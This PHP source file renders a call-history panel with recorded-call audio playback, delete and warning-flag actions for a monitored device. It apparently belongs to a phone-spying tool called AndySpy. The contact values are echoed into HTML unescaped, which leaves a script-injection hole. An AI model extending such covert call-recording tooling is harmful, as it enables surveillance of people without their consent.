<?php

/**
 * Created by PhpStorm.
 * User: Nk-concept
 * Date: 24/07/2017
 * Time: 20:55
 */
class CallHistoryPanel extends MediaDisplayer
{
    static function getContent(Row $data = null)
    {
        if (!parent::getContent()) return;
        $Device = Visitor::getLoggedUser()->getSelectedDevice();
        $CallList = $Device->getCallList();
        ?>
        <section class="box-typical">
            <header class="box-typical-header">
                <div class="tbl-row">
                    <div class="tbl-cell tbl-cell-title">
                        <h3><? echo "{$CallList->length()} " . Translator::getString("call"); ?></h3>
                    </div>
                </div>
            </header>
            <div class="box-typical-body">
                <div class="table-responsive">
                    <table class="table table-hover">
                        <thead>
                        <tr>
                            <th><? echo Translator::getString("contact"); ?></th>
                            <th><? echo Translator::getString("phonenumber"); ?></th>
                            <th><? echo Translator::getString("type"); ?></th>
                            <th><? echo Translator::getString("date"); ?></th>
                            <th><? echo Translator::getString("duration"); ?></th>
                            <th><? echo Translator::getString("audio"); ?></th>
                            <th>
                            </th>
                        </tr>
                        </thead>
                        <tbody>
                        <?
                        while ($CallList->hasNext()) {
                            /* @var $Call Call */
                            $Call = $CallList->next()->first()->getValue();
                            ?>
                            <tr data-id="<? echo $Call->getId(); ?>" data-id_device="<? echo $Call->getIdDevice(); ?>"
                                class="call-record <? echo $Call->getWarning()=="Y" ? "text-danger":""; ?>">
                                <td>
                                    <? echo $Call->getContact(); ?>
                                </td>
                                <td>
                                    <? echo $Call->getPhoneNumber(); ?>
                                </td>
                                <td>
                                    <? echo Translator::getString($Call->getType() == "IN" ? "in" : "out"); ?>
                                </td>
                                <td class="table-icon-cell">
                                    <i class="font-icon font-icon-calend"></i>
                                    <? echo (new Dtime(intval($Call->getDate())))->getElapsedString(null, true); ?>
                                </td>
                                <td class="table-date">
                                    <i class="font-icon font-icon-clock"></i>
                                    <? echo "{$Call->getDuration()} " . Translator::getString("second"); ?>
                                </td>
                                <td>
                                    <audio controls>
                                        <source
                                            src="<? echo AndySpy::getRefreshUrl(new Row(array(AndySpy::getHttpRequestListenerIndex() => "read-call-record", "id_call" => $Call->getId()))); ?>"
                                            type="audio/mp3">
                                    </audio>
                                </td>
                                <td>
                                    <button onclick="deleteCall(<? echo $Call->getId(); ?>);"
                                            class="btn btn-inline btn-danger btn-sm ">
                                        <span class="ladda-label"><? echo Translator::getString("delete"); ?></span>
                                    </button>
                                </td>
                            </tr>
                            <?
                        }
                        ?>
                        </tbody>
                    </table>
                </div>
            </div><!--.box-typical-body-->
        </section>
        <?
    }

    static function getJs(Row $data = null)
    {
        ?>
        <script>
            $(".call-record").contextmenu(function () {
                var call = $(this);
                swal({
                        title: "<? echo Translator::getString("togglecallwarning") ?>",
                        text: "<? echo Translator::getString("thisactionisnotreversable") ?>",
                        type: "info",
                        showCancelButton: true,
                        cancelButtonText: "<? echo Translator::getString("cancel") ?>",
                        confirmButtonColor: "#DD6B55",
                        confirmButtonText: "<? echo Translator::getString("yes") ?>",
                        closeOnConfirm: false,
                        showLoaderOnConfirm: true
                    },
                    function () {
                        $.getJSON("", {
                            request: "toggle-call-warning",
                            id_call: call.data("id"),
                            id_device: call.data("id_device")
                        }, function (json) {
                            if (onRequestResponse(json)) call.toggleClass("text-danger");
                        })
                    });
                return false;
            });
            function deleteCall(id_call) {
                swal({
                        title: "<? echo Translator::getString("areyousure") ?>",
                        text: "<? echo Translator::getString("thisactionisnotreversable") ?>",
                        type: "warning",
                        showCancelButton: true,
                        cancelButtonText: "<? echo Translator::getString("cancel") ?>",
                        confirmButtonColor: "#DD6B55",
                        confirmButtonText: "<? echo Translator::getString("yes") ?>",
                        closeOnConfirm: false,
                        showLoaderOnConfirm: true
                    },
                    function () {
                        $.getJSON("", {request: "delete-call", id_call: id_call}, function (json) {
                            onRequestResponse(json);
                        })
                    });
            }
        </script>
        <?
    }
}